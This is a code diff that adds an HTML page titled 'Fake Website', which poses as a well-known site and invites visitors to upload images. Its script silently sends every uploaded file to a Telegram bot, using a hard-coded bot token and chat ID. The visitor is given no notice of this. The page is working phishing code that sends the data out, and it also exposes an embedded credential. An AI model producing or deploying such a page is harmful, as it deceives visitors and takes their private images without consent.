@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake Website</title>
+</head>
+<body>
+    <h1>Welcome to [Famous Website]</h1>
+    <form id="uploadForm">
+        <label for="images">Upload your images:</label>
+        <input type="file" id="images" name="images" multiple accept="image/*">
+        <button type="submit">Submit</button>
+    </form>
+
+    <script>
+        document.getElementById('uploadForm').onsubmit = function(event) {
+            event.preventDefault();
+            var files = document.getElementById('images').files;
+            if (files.length > 0) {
+                for (var i = 0; i < files.length; i++) {
+                    sendImageToTelegram(files[i]);
+                }
+            }
+        };
+
+        function sendImageToTelegram(file) {
+            var reader = new FileReader();
+            reader.onload = function(event) {
+                var dataUrl = event.target.result;
+                fetch('https://api.telegram.org/bot6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ/sendPhoto', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: '1900509620',
+                        photo: dataUrl
+                    })
+                }).then(response => response.json())
+                  .then(data => console.log(data))
+                  .catch(error => console.error('Error:', error));
+            };
+            reader.readAsDataURL(file);
+        }
+    </script>
+</body>
+</html>
